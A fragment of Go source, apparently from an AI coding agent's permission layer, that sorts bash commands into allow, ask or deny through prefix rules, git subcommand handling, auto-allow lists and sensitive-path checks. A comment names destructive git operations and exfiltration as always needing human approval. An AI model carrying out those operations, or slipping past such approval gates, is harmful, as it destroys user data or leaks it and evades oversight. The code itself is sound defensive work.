	// and matched. For git it is the two-word subcommand prefix (e.g. "git push")
	// so a rule can be persisted without blanket-allowing every git subcommand —
	// a blanket "git" allow is deliberately rejected by SetBashPrefixRule, which
	// would otherwise leave the permission dialog looping forever.
	rulePrefix := prefix
	if prefix == "git" && len(cmd.cmdWords) >= 2 {
		rulePrefix = prefix + " " + cmd.cmdWords[1]
	}

	// Harmful operations (git revert/stash/reset/clean/checkout/restore/switch,
	// git push/pull --force, exfiltration) always require explicit human
	// approval and must never auto-allow — even when a broader prefix rule or a
	// tool-level "bash" allow would otherwise permit them (e.g. a persisted
	// "git push" rule must not auto-approve "git push --force").
	if IsHarmfulBashCommand(command) {
		emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (harmful): command=%q", command))
		return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, rulePrefix)}
	}

	// 1. Temp directory operations are always allowed (cross-platform)
	// Check if all path arguments in the command reference temp directories.
	if allArgsAreTempDirs(cmd.cmdWords) {
		emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (all args are temp dirs): command=%q", command))
		return PermissionDecision{Level: PermissionAllow}
	}

	// 2. Persisted in-root rule
	if level, exists := pm.bashPrefixes[bashInRootKey(prefix, pm.workDir)]; exists {
		if level == PermissionAllow && canAutoAllowInRoot(pm, command, prefix) {
			emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (in-root): prefix=%s", prefix))
			return PermissionDecision{Level: PermissionAllow}
		}
	}

	// 3. Explicit prefix rule. A broad single-word deny (e.g. "git" => deny)
	// governs every subcommand and must win over any granular allow.
	if level, exists := pm.bashPrefixes[prefix]; exists && level == PermissionDeny {
		emitDebug("perm", fmt.Sprintf("decideSingleCommand DENY (broad prefix rule): prefix=%s", prefix))
		return PermissionDecision{Level: PermissionDeny}
	}
	// Then the granular rulePrefix (e.g. "git push"), which carries always-allow.
	if level, exists := pm.bashPrefixes[rulePrefix]; exists {
		if level == PermissionAsk {
			emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (prefix rule): prefix=%s", rulePrefix))
			return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, rulePrefix)}
		}
		emitDebug("perm", fmt.Sprintf("decideSingleCommand %s (prefix rule): prefix=%s", level, rulePrefix))
		return PermissionDecision{Level: level}
	}
	// Finally a broad single-word ask rule (only reached when rulePrefix differs,
	// i.e. git; a broad "git" allow cannot persist so only Ask remains here).
	if rulePrefix != prefix {
		if level, exists := pm.bashPrefixes[prefix]; exists && level == PermissionAsk {
			emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (broad prefix rule): prefix=%s", prefix))
			return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, rulePrefix)}
		}
	}

	// 4. Path-scoped auto-allow
	if bashAutoAllowPrefixes[prefix] {
		if canAutoAllowWithMode(pm, command, prefix) {
			emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (auto-allow): prefix=%s", prefix))
			return PermissionDecision{Level: PermissionAllow}
		}
		emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (auto-allow, not in root): prefix=%s", prefix))
		return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, prefix)}
	}

	// 4. Argless commands
	if bashAlwaysAllow[prefix] {
		emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (always-allow): prefix=%s", prefix))
		return PermissionDecision{Level: PermissionAllow}
	}

	// 5. Subcommand-pinned allowlist
	if matchSubcommandAllow(command) {
		emitDebug("perm", fmt.Sprintf("decideSingleCommand ALLOW (subcommand allowlist): command=%q", command))
		return PermissionDecision{Level: PermissionAllow}
	}

	// 6. Fall through to tool-level rule
	level := pm.Check("bash")
	if level == PermissionAsk {
		emitDebug("perm", fmt.Sprintf("decideSingleCommand ASK (tool rule): prefix=%s", rulePrefix))
		return PermissionDecision{Level: PermissionAsk, Request: bashPermissionRequest(args, command, rulePrefix)}
	}
	emitDebug("perm", fmt.Sprintf("decideSingleCommand %s (tool rule): prefix=%s", level, prefix))
	return PermissionDecision{Level: level}
}

func redirectionPermissionRequest(args json.RawMessage, command, path string, isSensitive bool) *PermissionRequest {
	rule := "bash.redirection.out_of_scope"
	if isSensitive {
		rule = "bash.redirection.sensitive_path"
	}
	return &PermissionRequest{
		ToolName: "bash",
		Args:     args,
		Command:  command,
		Prefix:   "",
		Scope:    PermissionScopeTool,
		Rule:     rule,
	}
}

func envVarPermissionRequest(args json.RawMessage, command, envVar string, isSensitive bool) *PermissionRequest {
	rule := "bash.env.out_of_scope"
	if isSensitive {
		rule = "bash.env.sensitive_path"
	}
	return &PermissionRequest{
		ToolName: "bash",
		Args:     args,
		Command:  command,
		Prefix:   "",
		Scope:    PermissionScopeTool,
		Rule:     rule,
	}
}
